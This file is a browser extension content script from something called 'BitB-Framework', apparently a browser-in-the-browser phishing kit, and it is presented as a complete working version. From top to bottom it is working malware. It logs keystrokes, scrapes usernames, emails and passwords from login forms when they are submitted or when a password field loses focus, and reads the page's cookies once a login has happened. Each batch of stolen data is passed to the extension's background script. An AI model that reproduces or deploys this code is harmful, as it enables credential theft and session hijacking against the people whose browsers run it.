// =============================================
// BitB-Framework - Content Script
// Complete Working Version (Keystroke + Credentials + Browser Info + Cookie Stealing Once After Login)
// =============================================

let keystrokeBuffer = "";
let isActive = true;
let cookiesSentAfterLogin = false;   // Flag to prevent repeated sending

// ==================== KEYSTROKE LOGGER ====================
document.addEventListener("keydown", (event) => {
  if (!isActive) return;
  let key = event.key;
  if (key === "Enter") key = "[ENTER]";
  else if (key === "Backspace") key = "[BACK]";
  else if (key === " ") key = "[SPACE]";
  else if (key === "Tab") key = "[TAB]";
  keystrokeBuffer += key;
  if (keystrokeBuffer.length >= 30 || key.includes("[")) {
    browser.runtime.sendMessage({
      type: "keystroke",
      data: keystrokeBuffer
    });
    keystrokeBuffer = "";
  }
});

// ==================== CREDENTIAL STEALER + COOKIE STEALING ====================
function captureCredentialsAndCookies() {
  if (!isActive) return;

  const inputs = document.querySelectorAll("input");
  let creds = {
    url: window.location.href,
    timestamp: new Date().toISOString(),
    username: "",
    password: "",
    email: ""
  };

  inputs.forEach(input => {
    const type = input.type.toLowerCase();
    const value = input.value.trim();
    if (!value) return;
    if (type === "password" && value.length > 3) {
      creds.password = value;
    } else if (type === "email" || input.name.includes("email") || input.id.includes("email")) {
      creds.email = value;
    } else if ((type === "text" || type === "tel") &&
               (input.name.includes("user") || input.name.includes("login") ||
                input.id.includes("user") || input.name.includes("login"))) {
      creds.username = value;
    }
  });

  // If password is found → this is a login attempt
  if (creds.password && !cookiesSentAfterLogin) {
    // Send credentials
    browser.runtime.sendMessage({
      type: "credentials",
      data: creds
    });
    console.log("✅ Credentials captured from", window.location.href);

    // Send cookies only once after login
    extractAndSendCookies();
    cookiesSentAfterLogin = true;   // Prevent sending again until page reload
  }
}

// Extract and send cookies (only called once after login)
function extractAndSendCookies() {
  const cookies = document.cookie.split(';').map(c => {
    const [name, ...rest] = c.trim().split('=');
    return {
      name: name.trim(),
      value: rest.join('=').trim(),
      domain: window.location.hostname,
      path: '/',
      timestamp: new Date().toISOString()
    };
  }).filter(c => c.value !== '');

  if (cookies.length > 0) {
    browser.runtime.sendMessage({
      type: "cookies",
      data: {
        url: window.location.href,
        cookies: cookies,
        timestamp: new Date().toISOString()
      }
    });
    console.log("[BitB] Cookies sent after login");
  }
}

// Trigger on form submit and password field focus out
document.addEventListener("submit", () => setTimeout(captureCredentialsAndCookies, 800));
document.addEventListener("focusout", (e) => {
  if (e.target.type === "password") {
    setTimeout(captureCredentialsAndCookies, 800);
  }
});

// Reset flag when page changes (new login possible)
window.addEventListener('load', () => {
  cookiesSentAfterLogin = false;
});

console.log("✅ BitB-Framework Content Script Loaded on", window.location.href);
console.log("[BitB] Cookie stealing enabled (only once after login)");
